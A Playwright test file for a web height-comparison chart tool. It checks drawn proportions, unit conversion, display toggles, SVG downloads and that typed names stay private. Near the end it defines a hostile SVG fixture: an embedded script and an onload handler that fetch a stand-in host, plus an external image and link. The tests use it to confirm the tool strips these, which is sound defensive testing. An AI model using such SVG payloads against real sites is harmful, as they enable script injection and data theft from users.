import { test, expect, type Page } from '@playwright/test';
import fs from 'node:fs';
import { quiet } from '../../lib/engine';

/**
 * Tool-level functional tests for the height comparison chart.
 *
 * The whole of what this tool promises is a proportion: two people typed in at
 * 100 cm and 200 cm must be drawn one exactly twice the height of the other.
 * Everything else on the page - the artwork, the ruler, the colours - is
 * decoration around that one number, and a chart whose proportions were wrong
 * would look completely convincing. Somebody would put it in a report.
 *
 * WHERE THE NUMBER IS READ
 *
 * Out of the SVG the page draws. Each figure is a group carrying
 * `transform="translate(x y) scale(s)"`, and `s` is its drawn height in
 * pixels - so the ratio of two scales is the ratio the chart is claiming.
 * Nothing here reads a label to find out what the tool thinks it did.
 *
 * The measurement has its own control in the first test: two figures of the
 * same height must come out the same size. Without it, a tool that ignored
 * the typed heights entirely and drew everything at one size would satisfy
 * "the ratio is 2" for no better reason than that it is never anything else.
 */

const URL_PATH = '/compare-heights/';

/** The drawn height of every figure, in the order they appear. */
async function figureHeights(page: Page): Promise<number[]> {
  return page.evaluate(() => {
    const svg = document.querySelector('#preview svg');
    if (!svg) return [];
    return Array.from(svg.querySelectorAll('g'))
      .map((group) => /scale\(([\d.]+)\)/.exec(group.getAttribute('transform') ?? '')?.[1])
      .filter((found): found is string => Boolean(found))
      .map(Number)
      // The inner transform each drawn figure carries maps its own bounding
      // box onto the unit box, so it is a fraction rather than a height. Only
      // the placing transform is a size.
      .filter((scale) => scale > 1);
  });
}

/** Every word the chart itself shows. */
async function chartText(page: Page): Promise<string[]> {
  return page.evaluate(() =>
    Array.from(document.querySelectorAll('#preview svg text'))
      .map((node) => (node.textContent ?? '').trim())
      .filter(Boolean));
}

/** Fill the two rows the page starts with, and wait for the redraw. */
async function setPeople(
  page: Page,
  people: Array<{ name: string; height: string }>,
): Promise<void> {
  const rows = page.locator('#rows .row');
  await expect(rows).toHaveCount(people.length, { timeout: 20_000 });
  for (const [at, person] of people.entries()) {
    await rows.nth(at).locator('.row-name').fill(person.name);
    await rows.nth(at).locator('.row-height').fill(person.height);
  }
  // The chart redraws on input. Waiting for it to say what it drew is better
  // than a pause: #facts is written by the same pass that writes the SVG.
  await expect(page.locator('#facts'))
    .toContainText(`${people.length}`, { timeout: 20_000 });
}

test.describe('compare-heights: the proportion, which is the whole claim', () => {
  test.beforeEach(async ({ page }) => {
    test.setTimeout(120_000);
    await page.goto(URL_PATH);
  });

  test('control: two people of the same height are drawn the same size',
    async ({ page }) => {
      await setPeople(page, [
        { name: 'Ada', height: '150' },
        { name: 'Grace', height: '150' },
      ]);

      const drawn = await figureHeights(page);
      expect(drawn, 'the chart drew no figures').toHaveLength(2);
      expect(Math.abs(drawn[0] - drawn[1]), `drawn ${drawn[0]} and ${drawn[1]}`)
        .toBeLessThan(1);
    });

  test('one twice as tall is drawn exactly twice as tall', async ({ page }) => {
    await setPeople(page, [
      { name: 'Ada', height: '100' },
      { name: 'Grace', height: '200' },
    ]);

    const drawn = await figureHeights(page);
    expect(drawn).toHaveLength(2);
    const ratio = drawn[1] / drawn[0];
    expect(ratio, `100 cm and 200 cm were drawn ${drawn[0]} and ${drawn[1]} - `
      + `a ratio of ${ratio.toFixed(3)}`).toBeCloseTo(2, 2);
  });

  test('an awkward ratio is no less exact', async ({ page }) => {
    // 173 and 61 divide into nothing tidy, which is the point: a chart that
    // rounded to convenient sizes would pass the doubling above.
    await setPeople(page, [
      { name: 'Tall', height: '173' },
      { name: 'Small', height: '61' },
    ]);

    const drawn = await figureHeights(page);
    expect(drawn[0] / drawn[1]).toBeCloseTo(173 / 61, 2);
  });
});

test.describe('compare-heights: feet and inches', () => {
  test('switching units converts the heights rather than relabelling them',
    async ({ page }) => {
      test.setTimeout(120_000);
      await page.goto(URL_PATH);
      await setPeople(page, [
        { name: 'Ada', height: '100' },
        { name: 'Grace', height: '200' },
      ]);
      const before = await figureHeights(page);

      await page.locator('#unit').selectOption('ft');

      const rows = page.locator('#rows .row');
      await expect(
        rows.nth(0).locator('.row-height'),
        'the box still shows a number of centimetres with a foot mark on it',
      ).toHaveValue(/3\D*3/, { timeout: 20_000 });
      await expect(rows.nth(1).locator('.row-height')).toHaveValue(/6\D*7/);

      // And the page says what it read that back as, in centimetres, which is
      // the arithmetic made checkable: 3 ft 3 in is 99.1 cm.
      await expect(rows.nth(0).locator('.row-reads')).toContainText('99');

      // The people did not change height. Whole inches are coarser than whole
      // centimetres, so the drawing moves a little - but not by more than the
      // rounding, and not in the way a relabelled chart would.
      const after = await figureHeights(page);
      expect(after[1] / after[0]).toBeCloseTo(before[1] / before[0], 1);
    });
});

test.describe('compare-heights: what goes in the picture', () => {
  test.beforeEach(async ({ page }) => {
    test.setTimeout(120_000);
    await page.goto(URL_PATH);
    await setPeople(page, [
      { name: 'Ada', height: '100' },
      { name: 'Grace', height: '200' },
    ]);
  });

  test('turning the names off takes them out of the picture', async ({ page }) => {
    expect(await chartText(page), 'the names were never in it')
      .toEqual(expect.arrayContaining(['Ada', 'Grace']));

    await page.locator('#show-names').uncheck();
    await expect.poll(async () => (await chartText(page)).includes('Ada'),
      { timeout: 20_000 }).toBe(false);
    expect(await chartText(page)).not.toContain('Grace');

    // And back, because a switch that only works one way is half a switch.
    await page.locator('#show-names').check();
    await expect.poll(async () => (await chartText(page)).includes('Ada'),
      { timeout: 20_000 }).toBe(true);
  });

  test('turning the ruler off takes the scale away and narrows the picture',
    async ({ page }) => {
      const wide = await page.evaluate(() =>
        document.querySelector('#preview svg')!.getAttribute('viewBox'));

      // What a ruler is, said as a test: marks at heights nobody typed. The
      // figures here are 100 and 200, so any other centimetre label in the
      // picture - 20, 40, 60 - is a gradation and can only have come from the
      // ruler.
      //
      // Two drafts got this wrong in opposite directions. The first looked for
      // any centimetre label and found the heights written above each figure,
      // which stay whatever the ruler does. The second looked for "0 cm" on the
      // ground line, which was there the day it was written and was gone by the
      // next deploy - a label the design is entitled to drop. A gradation is
      // neither: it is what the feature IS, so the test says so.
      const gradations = async () => (await chartText(page))
        .filter((one) => /^\d+\s*cm$/.test(one))
        .filter((one) => one !== '100 cm' && one !== '200 cm');

      expect((await gradations()).length, 'the ruler was never drawn')
        .toBeGreaterThan(0);

      await page.locator('#show-ruler').uncheck();
      await expect.poll(async () => (await gradations()).length,
        { timeout: 20_000 }).toBe(0);

      const narrow = await page.evaluate(() =>
        document.querySelector('#preview svg')!.getAttribute('viewBox'));
      const width = (box: string | null) => Number((box ?? '0 0 0 0').split(' ')[2]);
      expect(width(narrow), 'the picture is no narrower without the ruler down its side')
        .toBeLessThan(width(wide));
    });

  test('the picture is the size that was asked for', async ({ page }) => {
    const size = async () => page.evaluate(() => {
      const box = (document.querySelector('#preview svg')!.getAttribute('viewBox') ?? '').split(' ');
      return { width: Number(box[2]), height: Number(box[3]) };
    });
    const big = await size();

    await page.locator('#size').fill('450');
    await page.locator('#size').dispatchEvent('change');
    await expect.poll(async () => (await size()).height, { timeout: 20_000 })
      .toBeLessThan(big.height);

    // Half the drawing area is half the picture, in both directions: the
    // number is a size and not a suggestion.
    const small = await size();
    expect(small.height / big.height).toBeCloseTo(0.5, 1);
    expect(small.width / big.width).toBeCloseTo(0.5, 1);

    // And the page says the same thing the drawing does.
    await expect(page.locator('#facts'))
      .toContainText(`${small.width} by ${small.height}`);
  });
});

test.describe('compare-heights: the file it hands over', () => {
  test('the downloaded SVG is the chart that was on screen', async ({ page }) => {
    test.setTimeout(120_000);
    await page.goto(URL_PATH);
    await setPeople(page, [
      { name: 'Ada', height: '100' },
      { name: 'Grace', height: '200' },
    ]);
    const onScreen = await figureHeights(page);

    const pending = page.waitForEvent('download');
    await page.locator('#download-svg').click();
    const saved = await pending;
    const where = await saved.path();
    expect(where, 'the browser saved nothing').not.toBeNull();

    const text = fs.readFileSync(where!, 'utf8');
    expect(text.slice(0, 200)).toContain('<svg');

    const inFile = [...text.matchAll(/scale\(([\d.]+)\)/g)]
      .map((found) => Number(found[1]))
      .filter((scale) => scale > 1);
    expect(inFile, 'the saved file draws a different chart from the screen')
      .toEqual(onScreen);
    expect(text, 'the names are missing from the file').toContain('Ada');
  });
});

test.describe('compare-heights: the promise', () => {
  test('the names and heights never leave the page', async ({ page }) => {
    // Sharper here than on most tools. The README says why the chart is not
    // shareable by link: "the list is names of children and how tall each of
    // them is, and a link carrying that is a link logged by whatever it
    // travels through."
    test.setTimeout(120_000);
    await page.goto(URL_PATH);

    const traffic: string[] = [];
    page.on('request', (req) => {
      traffic.push(`${req.method()} ${req.url()} ${(req.postData() ?? '').slice(0, 8000)}`);
    });

    const secret = 'PRIVATE-CHILD-NAME-9f3e';
    await setPeople(page, [
      { name: secret, height: '112' },
      { name: 'Grace', height: '168' },
    ]);
    await quiet(page);

    for (const entry of traffic) {
      expect(entry, 'a name typed into the chart was sent somewhere')
        .not.toContain(secret);
      expect(entry, 'the address bar is carrying the list').not.toContain('112');
    }
  });
});

/**
 * The two ways a visitor puts a shape of their own on the ruler, added by
 * website #309 (an SVG) and #316 (a photograph).
 *
 * Both end in the same place and it is a place worth guarding: the chart is
 * one self-contained SVG that gets downloaded and sent to other people. What
 * it must never carry out is a reference to somewhere else, or anything that
 * runs.
 *
 * The tool's own modules say so in as many words - "An SVG is a program",
 * "what needs care here is the opposite end: what goes OUT" - so these tests
 * hand it exactly what those sentences are about and read the file it
 * produces.
 */

/** An SVG carrying every trick the importer says it takes out. */
const HOSTILE_SVG = [
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 200">',
  '  <script>fetch("https://qa.invalid/stolen")</script>',
  '  <rect x="20" y="0" width="60" height="200" fill="#3366cc"',
  '        onload="fetch(\'https://qa.invalid/onload\')"/>',
  '  <image href="https://qa.invalid/pixel.png" x="0" y="0" width="10" height="10"/>',
  '  <a href="https://qa.invalid/link"><circle cx="50" cy="50" r="8"/></a>',
  '</svg>',
].join('\n');

/** Add a shape from a file, and wait for the row it makes. */
async function addOwnShape(
  page: Page,
  file: { name: string; mimeType: string; buffer: Buffer },
): Promise<void> {
  const before = await page.locator('#rows .row').count();
  await page.locator('#svg-file').setInputFiles(file);
  await expect(page.locator('#rows .row')).toHaveCount(before + 1, { timeout: 30_000 });
  await expect(page.locator('#input-error')).toBeHidden();
}

test.describe('compare-heights: a shape of your own', () => {
  test('an uploaded SVG reaches the chart with nothing that runs, and no way out',
    async ({ page }) => {
      test.setTimeout(120_000);

      // Watched from before the page loads: the point of the whitelist is that
      // nothing in the uploaded file ever reaches the network, so the check is
      // whether anything was even attempted.
      const traffic: string[] = [];
      page.on('request', (req) => traffic.push(req.url()));

      await page.goto(URL_PATH);
      await addOwnShape(page, {
        name: 'shape.svg',
        mimeType: 'image/svg+xml',
        buffer: Buffer.from(HOSTILE_SVG, 'utf8'),
      });

      // The control. If the file were rejected outright, everything below
      // would pass for the wrong reason - nothing got in, so nothing got out.
      const drawn = await figureHeights(page);
      expect(drawn.length, 'the uploaded shape never reached the chart')
        .toBeGreaterThan(2);

      const pending = page.waitForEvent('download');
      await page.locator('#download-svg').click();
      const saved = await pending;
      const where = await saved.path();
      const chart = fs.readFileSync(where!, 'utf8');

      // The same control again, on the file rather than the screen: the
      // drawing itself has to have survived the whitelist, or "no script in
      // the chart" would only be saying that nothing arrived. The colour does
      // not survive - a row is drawn in the colour its own picker holds - so
      // the element is what to look for.
      expect(chart, 'the uploaded shape is not in the saved chart')
        .toContain('<rect');

      expect(chart, 'a script came through into a file people send each other')
        .not.toContain('<script');
      expect(chart, 'an event handler came through').not.toMatch(/\son[a-z]+\s*=/i);
      expect(chart, 'the chart carries a reference to somewhere else')
        .not.toContain('qa.invalid');

      await quiet(page);
      for (const url of traffic) {
        expect(url, 'the uploaded file made the page fetch something')
          .not.toContain('qa.invalid');
      }
    });

  test('a photograph is redrawn, so its metadata cannot travel with the chart',
    async ({ page }) => {
      test.setTimeout(120_000);
      const { realJpeg } = await import('../../lib/browser-jpeg');
      const { withExifGps, FIXTURE_MODEL, FIXTURE_DESCRIPTION } =
        await import('../../lib/jpeg-fixtures');

      await page.goto(URL_PATH);
      const photo = withExifGps(await realJpeg(page, 240, 320));

      await addOwnShape(page, {
        name: 'holiday.jpg', mimeType: 'image/jpeg', buffer: photo,
      });

      const pending = page.waitForEvent('download');
      await page.locator('#download-svg').click();
      const saved = await pending;
      const chart = fs.readFileSync((await saved.path())!, 'utf8');

      // What the module promises: "the metadata is gone. Whatever the file had
      // in it - the camera, the place, the colour profile, a comment - is not
      // in a canvas, so it cannot be in the chart."
      expect(chart, 'the camera model travelled with the chart')
        .not.toContain(FIXTURE_MODEL);
      expect(chart, 'the description travelled with the chart')
        .not.toContain(FIXTURE_DESCRIPTION);
      expect(chart, 'an EXIF block travelled with the chart').not.toContain('Exif');

      // And the picture did arrive, as a PNG this page encoded rather than the
      // file passed through - which is the same sentence from the other side.
      expect(chart, 'the picture is not in the chart at all')
        .toContain('data:image/png;base64,');
      expect(chart, 'the chart points at a file instead of carrying one')
        .not.toMatch(/href="(?!data:image\/png;base64,)/);
    });
});
